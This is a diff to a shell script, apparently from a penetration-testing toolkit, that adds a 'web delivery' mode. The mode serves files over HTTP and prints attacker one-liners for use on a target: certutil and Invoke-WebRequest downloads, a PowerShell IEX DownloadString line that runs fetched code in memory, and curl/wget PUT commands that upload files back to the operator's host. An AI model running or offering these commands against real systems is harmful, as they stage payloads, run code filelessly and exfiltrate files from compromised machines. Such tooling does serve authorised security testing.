@@ -18,11 +18,39 @@ if [ "$WEB_DELIVERY_MODE" ]; then
         fi
     fi
     cd $PROJECT_WEB_DELIVERY
-    export LISTEN_ON=8890
+    export LHOST=${LHOST:-"127.0.0.1"}
+    export LISTEN_ON=${LISTEN_ON:-8890}
+    echo "=============================================================================================="
+    echo "                                        WEB DELIVERY BASIC INFO"
+    echo "YOUR IP: $LHOST       YOUR PORT: $LISTEN_ON"
+    echo "YOUR URL: http://$LHOST:$LISTEN_ON"
+    echo "=============================================================================================="
+    echo "                                        TIPS FOR WEB DELIVERY     "
+    echo "=============================================================================================="
+    echo "                                             DOWNLAODING"
     echo ""
-    echo "YOUR IP: $LHOST "
-    echo "YOUR URL: http://$LHOST:$LISTEN_ON "
+    echo "curl --output filename http://$LHOST:$LISTEN_ON/fname"
+    echo "wget http://$LHOST:$LISTEN_ON/fname"
+    echo "invoke-webrequest -outfile fname -usebasicparsing -uri http://$LHOST:$LISTEN_ON/fname"
+    echo "certutil.exe -urlcache -f http://$LHOST:$LISTEN_ON/fname fname.exe"
+    echo "=============================================================================================="
+    echo "                                     POWERSHELL MEMORY EXECUTION"
     echo ""
+    echo "IEX (New-Object Net.WebClient).DownloadString('http://$LHOST:$LISTEN_ON/fname')"
+    echo "=============================================================================================="
+    echo "                                            UPLOADING"
+    echo "PS: enable this need pdteam/simplehttpserver with -upload"
+    echo "    and following will put file in uploadfile"
+    echo ""
+    echo "curl http://$LHOST:$LISTEN_ON/uploadfile --upload-file filename"
+    echo "curl http://$LHOST:$LISTEN_ON/uploadfile -T filename"
+    echo "wget --output-document - --method=PUT http://$LHOST:$LISTEN_ON/uploadfile --body-file=filename"
+    echo "invoke-webrequest -Uri http://$LHOST:$LISTEN_ON/uploadfile -Method PUT -InFile filename" 
+    echo "=============================================================================================="
+    echo "PS: If your terminal can't display this notes properly, you need resize your terminal window."
+    echo ""
+    # ProjectDiscovery/SimpleHTTPServer
+    # simplehttpserver -listen 0.0.0.0:$LISTEN_ON -upload 
     python3 -m http.server $LISTEN_ON
     exit 0
 fi 
